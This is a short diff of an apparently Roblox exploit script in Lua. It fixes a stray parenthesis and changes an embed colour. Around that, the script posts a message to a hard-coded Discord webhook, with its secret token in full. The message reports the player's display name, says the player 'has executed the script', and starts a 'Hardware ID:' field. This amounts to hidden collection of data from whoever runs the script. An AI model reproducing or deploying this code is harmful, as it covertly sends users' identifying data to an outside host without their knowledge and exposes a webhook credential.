@@ -30,7 +30,8 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
-)
+
+
 HttpService = game:GetService("HttpService")
 Webhook_URL = "https://discord.com/api/webhooks/1039190195586744321/XAvTGrlAz_1ugWt7tnQeRR0fbA_BJf99CsnIiQHJ4RqUityFo8kITSu0C3DOYUx_MDcj"
 
@@ -47,7 +48,7 @@ local response = request(
 			["title"] = "",
 			["description"] = game.Players.LocalPlayer.DisplayName.." has executed the script.",
 			["type"] = "rich",
-			["color"] = tonumber(0xffffff),
+			["color"] = tonumber(0x7269da),
 			["fields"] = {
 				{
 					["name"] = "Hardware ID:",
